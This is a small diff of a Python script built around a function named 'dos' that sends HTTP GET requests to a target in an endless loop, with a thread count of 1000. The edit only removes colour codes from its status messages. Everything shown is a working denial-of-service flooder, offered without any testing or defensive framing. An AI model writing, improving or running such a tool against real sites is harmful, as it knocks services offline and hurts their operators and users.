@@ -7,9 +7,9 @@ def dos(target):
     while True:
         try:
             res = requests.get(target)
-            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
+            print("\nRequest sent!")
         except requests.exceptions.ConnectionError:
-            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
+            print("\nConnection error!")
 
 
 threads = 1000
